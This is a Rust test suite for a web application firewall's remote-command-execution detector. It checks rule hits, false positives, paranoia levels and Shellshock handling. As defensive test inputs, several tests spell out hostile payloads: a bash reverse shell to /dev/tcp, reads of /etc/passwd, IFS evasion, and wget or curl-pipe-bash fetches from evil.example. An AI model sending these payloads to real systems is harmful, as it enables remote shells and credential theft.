// SPDX-FileCopyrightText: 2026 0x00spor3
// SPDX-License-Identifier: Apache-2.0

use waf_core::{
    Bytes, Config, Decision, LimitsConfig, Normalized,
    RequestContext, Severity, WafMode, WafModule,
};
use waf_normalizer::Normalizer;
use waf_pipeline::{Pipeline, PipelineVerdict};

use waf_detection::rce::RceModule;
use waf_detection::sqli::SqliModule;

// ── helpers ───────────────────────────────────────────────────────────────────

fn base_config() -> Config {
    config_with_paranoia(3)
}

fn config_with_paranoia(paranoia_level: u8) -> Config {
    let mut c = Config::default();
    c.waf.paranoia_level = paranoia_level;
    c
}

fn scores_contains(d: &Decision, rule_id: &str) -> bool {
    matches!(d, Decision::Scores(items) if items.iter().any(|i| i.rule_id == rule_id))
}

fn base_ctx() -> RequestContext {
    RequestContext {
        client_ip: "127.0.0.1".parse().unwrap(),
        request_id: "t".to_string(),
        timestamp: std::time::SystemTime::now(),
        method: "GET".to_string(),
        path: "/".to_string(),
        raw_path: "/".to_string(),
        query: None,
        http_version: "HTTP/1.1".to_string(),
        headers: vec![],
        cookies: vec![],
        body: Bytes::new(),
        normalized: Normalized::default(),
        score: 0,
        score_contributions: vec![],
    }
}

fn make_rce() -> RceModule {
    let mut m = RceModule::new();
    m.init(&base_config());
    m
}

fn with_query(params: &[(&str, &str)]) -> RequestContext {
    let mut c = base_ctx();
    c.normalized.query_params = params
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
    c
}

/// Run the real normalizer over a raw query, returning the populated ctx.
fn normalized_query_ctx(query: &str) -> RequestContext {
    let mut c = base_ctx();
    c.query = Some(query.to_string());
    Normalizer::new(&LimitsConfig::default())
        .normalize(&mut c)
        .expect("normalization failed");
    c
}

// ── detection ─────────────────────────────────────────────────────────────────

#[test]
fn rce_command_substitution_detected() {
    let m = make_rce();
    let d = m.inspect(&with_query(&[("q", "$(whoami)")]));
    assert!(scores_contains(&d, "rce-cmd-substitution"), "got: {d:?}");
}

#[test]
fn rce_chained_command_detected() {
    let m = make_rce();
    let d = m.inspect(&with_query(&[("name", "foo; cat /etc/passwd")]));
    assert!(scores_contains(&d, "rce-chained-command"), "got: {d:?}");
}

#[test]
fn rce_encoded_chained_command_detected_via_normalizer() {
    // %3b -> ';', %20 -> ' ' : the normalizer reveals `;cat /etc/passwd`.
    let c = normalized_query_ctx("x=%3bcat%20/etc/passwd");
    let m = make_rce();
    assert!(
        scores_contains(&m.inspect(&c), "rce-chained-command"),
        "params: {:?}",
        c.normalized.query_params
    );
}

#[test]
fn rce_shell_path_detected() {
    let m = make_rce();
    assert!(scores_contains(&m.inspect(&with_query(&[("p", "/bin/bash")])), "rce-shell-path"));
}

#[test]
fn rce_windows_shell_detected() {
    let m = make_rce();
    let d = m.inspect(&with_query(&[("p", "cmd.exe /c dir")]));
    // cmd.exe matches the shell-path rule, "cmd.exe /c" matches windows-shell.
    assert!(scores_contains(&d, "rce-shell-path"), "got: {d:?}");
    assert!(scores_contains(&d, "rce-windows-shell"), "got: {d:?}");
}

#[test]
fn rce_reverse_shell_detected() {
    let m = make_rce();
    let d = m.inspect(&with_query(&[("c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")]));
    assert!(scores_contains(&d, "rce-reverse-shell"), "got: {d:?}");
}

#[test]
fn rce_backtick_detected() {
    let m = make_rce();
    assert!(scores_contains(&m.inspect(&with_query(&[("q", "`id`")])), "rce-backtick"));
}

#[test]
fn rce_ifs_evasion_detected() {
    let m = make_rce();
    let d = m.inspect(&with_query(&[("q", "${IFS}cat${IFS}/etc/passwd")]));
    assert!(scores_contains(&d, "rce-ifs-evasion"), "got: {d:?}");
}

#[test]
fn rce_download_exec_detected() {
    let m = make_rce();
    let d = m.inspect(&with_query(&[("u", "wget http://evil.example/x.sh")]));
    assert!(scores_contains(&d, "rce-download-exec"), "got: {d:?}");
}

#[test]
fn rce_logical_operator_detected_at_pl3() {
    let m = make_rce(); // PL3
    assert!(scores_contains(&m.inspect(&with_query(&[("q", "1 && cat x")])), "rce-logical-operator"));
}

// ── no false positives ────────────────────────────────────────────────────────

#[test]
fn rce_no_false_positives_on_legit_input() {
    let m = make_rce(); // PL3 — every rule active
    let legit = [
        ("cmd", "description"),                       // ?cmd=description
        ("user_id", "12345"),                          // legit *_id params
        ("order_id", "abc-123-def"),
        ("note", "please confirm the rm of old files"), // "rm" word, no separator
        ("bio", "valid id required for login"),         // "id" word, no separator
        ("price", "10 > 5"),                            // '>' is not a chaining char
        ("email", "john.doe@example.com"),
        ("path", "/home/user/reports"),                 // /home, not /bin
        ("lang", "C++ and Java"),                       // no && / ||
        ("text", "ping pong is fun"),                   // "ping" word, no separator
    ];
    for (k, v) in &legit {
        let ctx = with_query(&[(k, v)]);
        let d = m.inspect(&ctx);
        assert!(matches!(d, Decision::Allow), "false positive on {k}={v}: {d:?}");
    }
}

#[test]
fn rce_markdown_inline_code_does_not_block_alone() {
    // Realistic soft-FP: a comment with markdown inline code trips the PL2
    // backtick rule (Warning = 3), but that alone is below the threshold (5),
    // so the request is not blocked.
    let mut config = base_config();
    config.waf.mode = WafMode::Blocking;
    config.waf.block_threshold = 5;
    let pipeline = Pipeline::new(&config, vec![Box::new(RceModule::new())]);

    let mut ctx = with_query(&[("comment", "Use the `id` command to find your user")]);
    let verdict = pipeline.run(&mut ctx);
    assert!(matches!(verdict, PipelineVerdict::Allow), "markdown inline code must not block alone");
    assert_eq!(ctx.score, 3, "single Warning backtick contribution expected");
}

// ── paranoia level ────────────────────────────────────────────────────────────

#[test]
fn rce_paranoia_gates_backtick_and_logical_operator() {
    let backtick = with_query(&[("q", "`id`")]);
    let logical = with_query(&[("q", "a && b")]);

    let mut pl1 = RceModule::new();
    pl1.init(&config_with_paranoia(1));
    assert!(matches!(pl1.inspect(&backtick), Decision::Allow), "backtick off at PL1");
    assert!(matches!(pl1.inspect(&logical), Decision::Allow), "logical-op off at PL1");

    let mut pl2 = RceModule::new();
    pl2.init(&config_with_paranoia(2));
    assert!(scores_contains(&pl2.inspect(&backtick), "rce-backtick"), "backtick on at PL2");
    assert!(matches!(pl2.inspect(&logical), Decision::Allow), "logical-op still off at PL2");

    let mut pl3 = RceModule::new();
    pl3.init(&config_with_paranoia(3));
    assert!(scores_contains(&pl3.inspect(&logical), "rce-logical-operator"), "logical-op on at PL3");
}

#[test]
fn rce_high_confidence_rules_active_at_pl1() {
    let mut pl1 = RceModule::new();
    pl1.init(&config_with_paranoia(1));
    assert!(scores_contains(&pl1.inspect(&with_query(&[("q", "$(whoami)")])), "rce-cmd-substitution"));
}

// ── init behavior ─────────────────────────────────────────────────────────────

#[test]
fn rce_returns_allow_before_init() {
    let m = RceModule::new();
    assert!(matches!(m.inspect(&with_query(&[("q", "$(whoami)")])), Decision::Allow));
}

#[test]
fn rce_emits_critical_severity_for_substitution() {
    let m = make_rce();
    match m.inspect(&with_query(&[("q", "$(id)")])) {
        Decision::Scores(items) => {
            let it = items.iter().find(|i| i.rule_id == "rce-cmd-substitution").unwrap();
            assert_eq!(it.severity, Severity::Critical);
        }
        other => panic!("expected Scores, got {other:?}"),
    }
}

// ── F-3: Shellshock ─────────────────────────────────────────────────────────────

fn with_header(name: &str, value: &str) -> RequestContext {
    let mut c = base_ctx();
    c.normalized.headers = vec![(name.to_string(), value.to_string())];
    c
}

fn with_cookie(name: &str, value: &str) -> RequestContext {
    let mut c = base_ctx();
    c.normalized.cookies = vec![(name.to_string(), value.to_string())];
    c
}

#[test]
fn rce_shellshock_user_agent_detected() {
    // The classic CVE-2014-6271 vector: UA is deny-listed for general inspection but
    // the dedicated single-pattern scan catches it.
    let d = make_rce().inspect(&with_header("user-agent", "() { :;}; echo vulnerable"));
    let it = match &d {
        Decision::Scores(items) => items.iter().find(|i| i.rule_id == "rce-shellshock"),
        _ => None,
    };
    assert_eq!(it.map(|i| i.severity), Some(Severity::Critical), "got: {d:?}");
}

#[test]
fn rce_shellshock_cookie_detected() {
    // The parsed-cookie channel is already scanned by the main set — no special handling.
    let d = make_rce().inspect(&with_cookie("m", "() { :"));
    assert!(scores_contains(&d, "rce-shellshock"), "got: {d:?}");
}

#[test]
fn rce_shellshock_referer_detected() {
    let d = make_rce().inspect(&with_header("referer", "() { :;}; echo vulnerable"));
    assert!(scores_contains(&d, "rce-shellshock"), "got: {d:?}");
}

#[test]
fn rce_shellshock_query_param_detected() {
    let d = make_rce().inspect(&with_query(&[("x", "() { :;}; id")]));
    assert!(scores_contains(&d, "rce-shellshock"), "got: {d:?}");
}

#[test]
fn rce_shellshock_not_double_counted_across_ua_and_cookie() {
    // The signature in BOTH the UA and a cookie must still yield a single contribution.
    let mut c = base_ctx();
    c.normalized.headers = vec![("user-agent".to_string(), "() { :;}".to_string())];
    c.normalized.cookies = vec![("m".to_string(), "() { :".to_string())];
    match make_rce().inspect(&c) {
        Decision::Scores(items) => {
            let n = items.iter().filter(|i| i.rule_id == "rce-shellshock").count();
            assert_eq!(n, 1, "rce-shellshock emitted {n} times: {items:?}");
        }
        other => panic!("expected Scores, got {other:?}"),
    }
}

#[test]
fn rce_shellshock_no_fp_on_minified_js() {
    // `function(){}` — an identifier precedes the empty parens, so the boundary-anchored
    // pattern must NOT match (the whole reason for the tightening).
    let d = make_rce().inspect(&with_query(&[("cb", "handler=function(){}")]));
    assert!(!scores_contains(&d, "rce-shellshock"), "false positive on minified JS: {d:?}");
}

#[test]
fn rce_shellshock_no_fp_on_benign_cookie() {
    let d = make_rce().inspect(&with_cookie("pref", "{a:1}"));
    assert!(!scores_contains(&d, "rce-shellshock"), "false positive on benign cookie: {d:?}");
}

#[test]
fn rce_shellshock_ua_not_scanned_by_other_rules() {
    // The dedicated UA scan runs ONLY the shellshock pattern — a shell idiom in the UA
    // that the full RCE set would flag must NOT be picked up here (UA stays deny-listed
    // for general inspection; only the tight shellshock pattern reads it).
    let d = make_rce().inspect(&with_header("user-agent", "curl http://evil.example/x.sh | bash"));
    assert!(matches!(d, Decision::Allow), "UA leaked into the general RCE set: {d:?}");
}

// ── pipeline integration / cumulative scoring ──────────────────────────────────

#[test]
fn rce_contributes_to_cumulative_score_with_sqli() {
    // Detection-only runs every module; a payload tripping both SQLi and RCE
    // accumulates contributions from both. (sqli and rce are both Body phase.)
    let config = base_config(); // DetectionOnly

    let modules: Vec<Box<dyn WafModule>> = vec![
        Box::new(SqliModule::new()),
        Box::new(RceModule::new()),
    ];
    let pipeline = Pipeline::new(&config, modules);

    let mut ctx = with_query(&[("p", "1 UNION SELECT 1; cat /etc/passwd")]);
    let verdict = pipeline.run(&mut ctx);

    assert!(matches!(verdict, PipelineVerdict::Allow)); // detection-only
    assert!(ctx.score_contributions.iter().any(|c| c.module == "sqli"));
    assert!(ctx.score_contributions.iter().any(|c| c.module == "rce"));
}

#[test]
fn rce_blocks_in_blocking_mode() {
    let mut config = base_config();
    config.waf.mode = WafMode::Blocking;
    config.waf.block_threshold = 5;
    let pipeline = Pipeline::new(&config, vec![Box::new(RceModule::new())]);
    let mut ctx = with_query(&[("c", "; cat /etc/passwd")]); // chained-command = Critical 5
    assert!(matches!(pipeline.run(&mut ctx), PipelineVerdict::Block { .. }));
}
